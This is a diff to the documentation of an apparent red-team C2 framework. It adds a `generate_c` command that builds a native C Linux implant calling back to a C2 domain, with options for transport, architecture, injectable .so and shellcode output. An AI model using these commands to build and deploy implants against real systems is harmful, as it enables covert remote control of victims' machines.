@@ -239,19 +239,32 @@ generate --type windows_executable --arch amd64 --cc your.domain.com \
 
 #### Native C agent
 
-The native C agent is a payload type of `generate`. It is built on demand from
-`core/c_agent` with a config encrypted under the C2's `MagicString`:
+The native C agent has its own `generate_c` command, built on demand from
+`core/c_agent` with a config encrypted under the C2's `MagicString`. `--type`
+selects the libc variant rather than a Go payload type, and `--arch` selects a
+C toolchain target:
 
 ```bash
-generate --type aquila --cc your.domain.com
-generate --type aquila --cc your.domain.com --crypto mbedtls --gzip none
+generate_c --type glibc --arch amd64 --cc your.domain.com
+generate_c --cc your.domain.com --crypto mbedtls --gzip none
+# transports: libcurl (default), http_raw (self-contained plain HTTP),
+# libssl (raw TCP + TLS)
+generate_c --cc your.domain.com --transport http_raw
+generate_c --cc your.domain.com --transport libssl
 # musl target (Alpine and other musl hosts); dynload follows the library
-generate --type aquila --cc your.domain.com --libc musl
+generate_c --type musl --arch arm64 --cc your.domain.com
 # artifact formats: exe (default), so (dlopen/injection), shellcode (malasada PIC)
-generate --type aquila --cc your.domain.com --format so
+generate_c --cc your.domain.com --format so
 ```
 
-Output: `aquila_linux_<timestamp>` (`.so` / `.bin` for `--format so` / `--format shellcode`).
+Available `--type`: `glibc`, `musl`. Available `--arch`: `amd64`, `386`, `arm`,
+`arm64`, `riscv64`. `riscv64` requires `--type musl`; `--format shellcode`
+requires `amd64` + `glibc`. Available `--transport`: `libcurl` (default,
+HTTP/HTTPS), `http_raw` (plain HTTP, no external libraries), `libssl` (plain
+HTTP plus HTTPS via libssl).
+
+Output: `aquila_linux_<arch>_<timestamp>` (`.so` / `.bin` for `--format so` /
+`--format shellcode`).
 
 Mesh nodes may run different transports. Each agent advertises the transport and
 port its relay listens on, and dialers always use the _peer's_ advertised
